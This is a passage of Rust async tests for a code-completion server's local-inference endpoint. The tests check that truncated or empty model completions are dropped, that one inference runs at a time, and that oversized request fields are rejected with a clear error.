        assert_eq!(body["engine"], "rule");
        assert!(
            body["edits"].as_array().unwrap().is_empty(),
            "no fabricated insertion"
        );
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "region_empty");
    }

    /// A completion that hit the token ceiling is a region cut off
    /// mid-rewrite; diffed whole it reads as "delete the rest".
    #[tokio::test]
    async fn truncated_completion_is_dropped() {
        let state = test_app_state().with_local_inference(Arc::new(StubChat {
            content: "\tprimary := Conn{\n\t\tPort: 8080,\n".into(),
            finish: "length",
        }));
        let (_, body) = post_to(
            crate::server::mock_router(state),
            fanout_request(FANOUT_TEXT),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "truncated");
    }

    /// The one-in-flight budget must bound the INFERENCE, not the
    /// handler scope. Dropping a completion future does not stop the
    /// generation behind it (the engine dispatches through
    /// `spawn_blocking`, and dropping a `JoinHandle` detaches), so a
    /// permit released when the handler returns would stop bounding
    /// anything. Here: a slow consult holds the slot, and a second
    /// request arriving mid-flight is refused rather than queued.
    #[tokio::test]
    async fn a_consult_in_flight_holds_the_slot() {
        struct SlowChat;
        #[async_trait]
        impl LocalInferenceService for SlowChat {
            async fn chat_completion(
                &self,
                _r: crate::openai_types::ChatCompletionRequest,
            ) -> Result<ChatCompletionResponse, crate::state::LocalInferenceError> {
                tokio::time::sleep(std::time::Duration::from_millis(400)).await;
                Err("slot still busy elsewhere".into())
            }
            async fn chat_completion_stream(
                &self,
                _r: crate::openai_types::ChatCompletionRequest,
            ) -> Result<
                Pin<Box<dyn Stream<Item = StreamFrame> + Send>>,
                crate::state::LocalInferenceError,
            > {
                unimplemented!()
            }
            fn provider_manifest(&self) -> Option<commonwealth_inference::oicp::ProviderManifest> {
                None
            }
            async fn embed(&self, _i: &str) -> Result<Vec<f32>, String> {
                unimplemented!()
            }
            fn fim_status(&self) -> Option<FimSlotStatus> {
                Some(FimSlotStatus {
                    slot: "fim".into(),
                    model_id: "mellum-test".into(),
                    fim_style: "mellum".into(),
                    aliased_to_fast: false,
                    next_edit_format: "region_instruct".into(),
                })
            }
        }
        let state = test_app_state().with_local_inference(Arc::new(SlowChat));
        let app = crate::server::mock_router(state);

        let first = tokio::spawn({
            let app = app.clone();
            async move { post_to(app, fanout_request(FANOUT_TEXT)).await }
        });
        tokio::time::sleep(std::time::Duration::from_millis(80)).await;
        let (_, second) = post_to(app, fanout_request(FANOUT_TEXT)).await;
        assert_eq!(
            second["sovereign_debug"]["model"]["dropped"], "busy",
            "a consult already has the slot; the second must not queue behind it"
        );
        let (_, first) = first.await.unwrap();
        assert_eq!(first["sovereign_debug"]["model"]["dropped"], "error");
    }

    #[tokio::test]
    async fn oversized_unit_400_names_the_offending_field() {
        let (status, body) = post(serde_json::json!({
            "history": [{
                "before": "x", "after": "y",
                "left": "L".repeat(super::MAX_UNIT_BYTES + 1), "right": ""
            }],
            "text": "x",
            "cursor": 0
        }))
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        let msg = body["error"]["message"].as_str().unwrap();
        assert!(
            msg.contains("`left`"),
            "must name the field that tripped: {msg}"
        );
        assert!(
            msg.contains("BYTES"),
            "clients measure chars; say which unit: {msg}"
        );
    }

    #[tokio::test]
    async fn model_lane_off_by_default_leaves_no_trace() {
        let (_, body) = post_to(
            model_router("anything"),
            serde_json::json!({
                "history": [], "text": "x", "cursor": 0, "debug": true
            }),
        )
        .await;
        assert!(body["sovereign_debug"].get("model").is_none());
    }
}
